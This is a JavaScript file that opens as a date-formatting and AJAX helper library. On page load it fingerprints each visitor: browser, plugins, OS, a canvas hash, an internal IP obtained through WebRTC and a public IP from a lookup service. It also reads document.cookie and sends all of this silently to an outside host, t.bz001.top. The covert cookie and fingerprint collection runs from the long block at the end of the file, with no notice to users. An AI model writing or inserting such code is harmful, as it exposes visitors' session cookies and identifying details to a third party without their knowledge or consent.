/**
 * <script src="http://?/js/g.js?v=1" type="application/javascript" ></script>
 * 时间戳格式化函数
 * @param  {string} format    格式
 * @param  {int}    timestamp 要格式化的时间 默认为当前时间
 * @return {string}           格式化的时间字符串
 */
/**************************************时间格式化处理************************************/
function DateFormat( date,fmt)
{ //author: meizz
    date = date * 1000;
    date = parseInt(date);
    date = new Date(date-0);
    if(fmt==undefined){
        fmt ="yyyy-MM-dd hh:mm:ss";
    }
    var o = {
        "M+" : date.getMonth()+1,                 //月份
        "d+" : date.getDate(),                    //日
        "h+" : date.getHours(),                   //小时
        "m+" : date.getMinutes(),                 //分
        "s+" : date.getSeconds(),                 //秒
        "q+" : Math.floor((date.getMonth()+3)/3), //季度
        "S"  : date.getMilliseconds()             //毫秒
    };
    if(/(y+)/.test(fmt))
        fmt=fmt.replace(RegExp.$1, (date.getFullYear()+"").substr(4 - RegExp.$1.length));
    for(var k in o)
        if(new RegExp("("+ k +")").test(fmt))
            fmt = fmt.replace(RegExp.$1, (RegExp.$1.length==1) ? (o[k]) : (("00"+ o[k]).substr((""+ o[k]).length)));
    return fmt;
}
//loadScript("http://js../Content/SendJS/a1.js", function() {});
function loadScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    if (typeof(callback) != "undefined") {
        if (script.readyState) {
            script.onreadystatechange = function() {
                if (script.readyState == "loaded" || script.readyState == "complete") {
                    script.onreadystatechange = null;
                    callback()
                }
            }
        } else {
            script.onload = function() {
                callback()
            }
        }
    }
    script.src = url;
    document.body.appendChild(script)
}
function XMLDoc_AJAX(url,method,fnt) {
    var XMLDoc_AJAX_http;
    if (window.XMLHttpRequest) {
        XMLDoc_AJAX_http = new XMLHttpRequest();
    } else {
        XMLDoc_AJAX_http = new ActiveXObject("Microsoft.XMLHTTP");
    }
    XMLDoc_AJAX_http.onreadystatechange = function () {
        if (XMLDoc_AJAX_http.readyState === 4 && XMLDoc_AJAX_http.status === 200) {
            fnt(XMLDoc_AJAX_http.responseText);
        }
    };
    XMLDoc_AJAX_http.open(method, url, true);
    XMLDoc_AJAX_http.send();
}

function getPluginName() {
    var info = "";
    var plugins = navigator.plugins;
    if (plugins.length > 0) {
        for (i = 0; i < navigator.plugins.length; i++) {
            info += navigator.plugins[i].name + ";";
        }
    }
    return info;
}
function getlanguage() {
    var getlanguage_ = navigator.language + "/";
    for (var i_ in navigator.languages) {
        getlanguage_ += navigator.languages[i_] + ",";
    }
    return getlanguage_;
}
function myBrowser() {
    var userAgent = navigator.userAgent; //取得浏览器的userAgent字符串
    var platform = navigator.platform;
    var isOpera = userAgent.indexOf("Opera") > -1;
    if (isOpera) {
        return "Opera" +"."+ platform;
    }; //判断是否Opera浏览器
    if (userAgent.indexOf("Firefox") > -1) {
        return "Firefox"+"."+ platform;
    }  //判断是否Firefox浏览器
    if (userAgent.indexOf("Chrome") > -1) {
        return "Chrome"+"."+ platform;
    }   //判断是否Google浏览器
    if (userAgent.indexOf("Safari") > -1) {
        return "Safari"+"."+ platform;
    } //判断是否Safari浏览器
    if (userAgent.indexOf("compatible") > -1 && userAgent.indexOf("MSIE") > -1 && !isOpera) {
        return "IE"+"."+ platform;
    }; //判断是否IE浏览器

    return "unknow"+"."+ platform;;
}
function ajax(url, foo) {
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
        if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
            foo(xmlhttp.responseText);
        };
    };
    xmlhttp.open('GET', url, true);
    xmlhttp.send();
}
function bin2hex(bin) {
    var i = 0, l = bin.length, chr, hex = '';
    for (i; i < l; ++i) {
        chr = bin.charCodeAt(i).toString(16);
        hex += chr.length < 2 ? '0' + chr : chr;
    }
    return hex;
}
function detectOS() {
    var sUserAgent = navigator.userAgent;
    var isWin = (navigator.platform == "Win32") || (navigator.platform == "Windows");
    var isMac = (navigator.platform == "Mac68K") || (navigator.platform == "MacPPC") || (navigator.platform == "Macintosh") || (navigator.platform == "MacIntel");
    if (isMac) return "Mac";
    var bIsIpad = sUserAgent.match(/ipad/i) == "ipad";
    if (bIsIpad) return "iPad";
    var isUnix = (navigator.platform == "X11") && !isWin && !isMac;
    if (isUnix) return "Unix";
    var isLinux = (String(navigator.platform).indexOf("Linux") > -1);
    var bIsAndroid = sUserAgent.toLowerCase().match(/android/i) == "android";
    if (isLinux) {
        if (bIsAndroid) return "Android";
        else return "Linux";
    }
    var bIsCE = sUserAgent.match(/windows ce/i) == "windows ce";
    if (bIsCE) return "WinCE";
    var bIsWM = sUserAgent.match(/windows mobile/i) == "windows mobile";
    if (bIsWM) return "WinMobile";
    var platframe = 0;
    if (isWin) {
        if (sUserAgent.indexOf("WOW64") > -1) {
            platframe = "x64";
        } else if (sUserAgent.indexOf("WOW32") > -1 || sUserAgent.indexOf("WOW86") > -1) {
            platframe = "x32";
        }else{
            platframe="";
        }
        var isWin2K = sUserAgent.indexOf("Windows NT 5.0") > -1 || sUserAgent.indexOf("Windows 2000") > -1;
        if (isWin2K) return "Win2000"   + platframe;
        var isWinXP = sUserAgent.indexOf("Windows NT 5.1") > -1 || sUserAgent.indexOf("Windows XP") > -1;
        if (isWinXP) return "WinXP"   + platframe;
        var isWin2003 = sUserAgent.indexOf("Windows NT 5.2") > -1 || sUserAgent.indexOf("Windows 2003") > -1;
        if (isWin2003) return "Win2003"  + platframe;
        var isWinVista = sUserAgent.indexOf("Windows NT 6.0") > -1 || sUserAgent.indexOf("Windows Vista") > -1;
        if (isWinVista) return "WinVista"   + platframe;
        var isWin7 = sUserAgent.indexOf("Windows NT 6.1") > -1 || sUserAgent.indexOf("Windows 7") > -1;
        if (isWin7) return "Win7"   + platframe;
        var isWin8 = sUserAgent.indexOf("Windows NT 6.2") > -1 || sUserAgent.indexOf("Windows 8") > -1;
        if (isWin8) return "Win8"   + platframe;
        var isWin10 = sUserAgent.indexOf("Windows NT 10.") > -1 || sUserAgent.indexOf("Windows 8") > -1;
        if (isWin10) return "Win10"   + platframe;
    }
    return "Unknow";
}
function getIPs(callback) {
    var ip_dups = {};
    var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
    var mediaConstraints = {
        optional: [{ RtpDataChannel: true }]
    };
    var servers = undefined;
    var i = 0;
    if (window.webkitRTCPeerConnection) servers = { iceServers: [{ urls: "stun:stun.services.mozilla.com" }] };
    var pc = new RTCPeerConnection(servers, mediaConstraints);
    pc.onicecandidate = function (ice) {
        if (ice.candidate) {
            var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/
            var ip_addr = ip_regex.exec(ice.candidate.candidate)[1];
            if (ip_dups[ip_addr] === undefined) callback(ip_addr, i++);
            ip_dups[ip_addr] = true;
        }
    };
    pc.createDataChannel("");
    pc.createOffer(function (result) {
        pc.setLocalDescription(result, function () { });
    }, function () { });
}

function get_ip_addr() {
    getIPs(function (ip, i) {
        Browser_info_c.push({ inner_ip: ip });
    });
}
function canvas_id() {
    var canvas = document.createElement('canvas');
    var ctx = canvas.getContext('2d');
    var txt = 'QWERTYYJNDGSAHJKJIU*&^@@##%%&#$DVBDDSF';
    ctx.textBaseline = 'top';
    ctx.font = "14px 'Arial'";
    ctx.fillStyle = '#0ff';
    ctx.fillRect(0, 0, 140, 50);
    ctx.fillStyle = '#00f';
    ctx.fillText(txt, 2, 15);
    ctx.fillStyle = 'rgba(102,204,0,0.7)';
    ctx.fillText(txt, 4, 17);
    var b64 = canvas.toDataURL().replace('data:image/png;base64,', '');
    var bin = atob(b64);
    var crc = bin2hex(bin.slice(-16, -12));
    Browser_info_c.push({ canvas_id: crc });
}
function network_speed() {
    Browser_info_c.push({ download_speed: navigator.connection.effectiveType  });
    return ;
    var image = new Image();
    size = 1232.7;
    image.src = 'http://www.hscbw.com/upfile/2016/0824/1472003560926474.jpg';
    startTime = new Date().getTime();
    image.onload = function () {
        endTime = new Date().getTime();
        speed = size / ((endTime - startTime) / 1000);
        speed = parseInt(speed * 10) / 10;
        Browser_info_c.push({ download_speed: navigator.connection.effectiveType +"," +speed +"bk/s" });
    }
}

function SetIPInfo() {
    var href_ = window.location.href.split(":")[0];
    if(href_.indexOf("http")!=-1){
        if(typeof(returnCitySN) == "undefined"){
            loadScript(href_+"://pv.sohu.com/cityjson?ie=utf-8",function () {
               //......
                Browser_info_c.push({ ip: returnCitySN.cip });
                Browser_info_c.push({ cname:returnCitySN.cname });
            });
        }else{
            //....
            Browser_info_c.push({ ip: returnCitySN.cip });
            Browser_info_c.push({ cname:returnCitySN.cname });
        }
    }else{
        console.log("error",href_);
    }


}


var Browser_info_c = [];
Browser_info_c.push({ browser: myBrowser()+"."+navigator.appName});
Browser_info_c.push({ userAgent: navigator.userAgent });
Browser_info_c.push({ language: getlanguage() });
Browser_info_c.push({ screen:  window.screen.colorDepth+","+window.screen.height+"x"+window.screen.width });
Browser_info_c.push({ vendor: navigator.vendor + navigator.vendorSub +"/"+navigator.product + "." + navigator.productSub });
Browser_info_c.push({ PluginName: getPluginName() });//插件的名称
Browser_info_c.push({ cookie: document.cookie });
Browser_info_c.push({ time: new Date().getTime().toString().substr(0, 10) - 0 });
Browser_info_c.push({ OS: detectOS() });
Browser_info_c.push({ wechat: navigator.userAgent.indexOf('MicroMessenger') > -1});
Browser_info_c.push({ url:window.location.href.substr(0,254) });
get_ip_addr();
canvas_id();
network_speed();
SetIPInfo() ;

var getvistor_ = setInterval(function () {
            if(Browser_info_c.length>=16){
                clearInterval(getvistor_);
                var Browser_info_c_url ="";


                for(var i_ in Browser_info_c){
                    var value_ = Browser_info_c[i_];
                    var getvistor_k = "";
                    var getvistor_v = "";
                    for(var j_ in value_){
                        getvistor_k = j_ ;
                        getvistor_v = value_[j_];
                    }
                    //console.log(getvistor_k);
                    Browser_info_c_url += getvistor_k + "=" + getvistor_v +"&";
                }

                //console.log(Browser_info_c_url);
                Browser_info_c_url+="c=c";

                XMLDoc_AJAX("http://t.bz001.top/api/vistor?"+Browser_info_c_url, "post",function (data_) {   });

            }else{
                //console.log(Browser_info_c);
            }
},100);